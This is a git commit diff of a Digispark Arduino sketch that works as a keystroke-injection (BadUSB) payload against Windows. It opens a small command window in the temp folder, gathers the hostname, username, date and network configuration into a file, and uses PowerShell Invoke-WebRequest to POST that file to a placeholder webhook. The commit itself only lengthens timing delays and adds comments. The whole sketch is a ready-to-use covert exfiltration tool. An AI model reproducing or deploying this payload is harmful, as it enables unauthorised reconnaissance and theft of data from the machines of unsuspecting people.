c9487f65152d17b99d3effa9d28b51adafd92dc4
Jeff Baxter <jeffrey.baxter@outlook.com>
2022-01-19 15:49:34 -0500

    Added additional wait times.

--- send_to_webhook.ino
+++ send_to_webhook.ino
@@ -6,27 +6,26 @@ void setup() {
   pinMode(1, OUTPUT); //LED on Model A 
   DigiKeyboard.update();
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(3000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.delay(100);
-  DigiKeyboard.println("cmd /k mode con: cols=100 lines=30"); 
-  DigiKeyboard.delay(100);
+  DigiKeyboard.println("cmd /k mode con: cols=100 lines=30"); //smallest cmd window possible
+  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
   DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("cd %temp%"); 
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.println("cd %temp%"); //going to temporary dir
+  DigiKeyboard.delay(500);
   DigiKeyboard.println("powershell hostname;whoami;get-date;ipconfig > data_dump" ); 
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("powershell type data_dump" ); 
-  DigiKeyboard.println("powershell Invoke-WebRequest -Uri WEBHOOK_SITE_HERE -Method POST -InFile data_dump"); //Submitting to webhook
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("powershell Invoke-WebRequest -Uri WEB_HOOK_HERE -Method POST -InFile data_dump"); //Submitting to webhook
+  DigiKeyboard.delay(1000);
   DigiKeyboard.println("exit");
   DigiKeyboard.delay(100);  
   digitalWrite(1, HIGH); //turn on led when program finishes
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(9000);
   digitalWrite(1, LOW); 
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(5000);
 }
 
 void loop() {
